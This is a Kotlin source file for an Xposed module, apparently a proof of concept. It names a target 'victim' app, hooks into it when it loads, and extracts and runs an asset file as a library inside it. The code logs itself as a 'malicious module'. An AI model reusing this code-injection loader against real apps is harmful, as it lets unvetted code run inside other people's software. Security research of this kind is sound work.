@file:JvmName("XposedModule") // Prevent kotlin from renaming the file
package com.virtualxposed.codeloader

import android.app.Application
import android.content.Context
import de.robv.android.xposed.IXposedHookLoadPackage
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage


class XposedModule : IXposedHookLoadPackage {
    companion object {
        private const val TAG = "CodeLoader"
        const val VICTIM_APP = "com.virtualxposed.victim"

        private fun log(message: String) {
            XposedBridge.log("$TAG: $message")
        }
    }

    // I prefer this over Application.attach() because the current implementation only
    // supports one hook per function
    fun getApplicationContext(): Context? {
        return try {
            val activityThreadClass = XposedHelpers.findClass("android.app.ActivityThread", null)
            val currentActivityThread =
                XposedHelpers.callStaticMethod(activityThreadClass, "currentActivityThread")
            val application =
                XposedHelpers.callMethod(currentActivityThread, "getApplication") as? Application
            application?.applicationContext
        } catch (_: Exception) {
            null
        }
    }


    override fun handleLoadPackage(params: XC_LoadPackage.LoadPackageParam?) {
        if (params?.packageName == BuildConfig.APPLICATION_ID) {
            log("Self-loaded module with version ${BuildConfig.VERSION_NAME}")
            val buildClass = XposedHelpers.findClass(
                MainActivity::class.java.name,
                params.classLoader
            )

            XposedHelpers.setStaticObjectField(
                buildClass,
                MainActivity::isLoaded.name,
                true
            )
            return
        }
        if (params?.packageName != VICTIM_APP) {
            log("Not loading module $TAG since ${params?.packageName} is not $VICTIM_APP")
            return
        }

        log("Loaded malicious module $TAG version ${BuildConfig.VERSION_NAME} to package: ${params.packageName}")

        val context = getApplicationContext()
        if (context == null) {
            log("Unable to get application context. Quitting early.")
            return
        }

        val apkFile = ExecuteHelper.getAssetFile(context, true) ?: return
        ExecuteHelper.executeAndroidLibrary(context, apkFile)
    }
}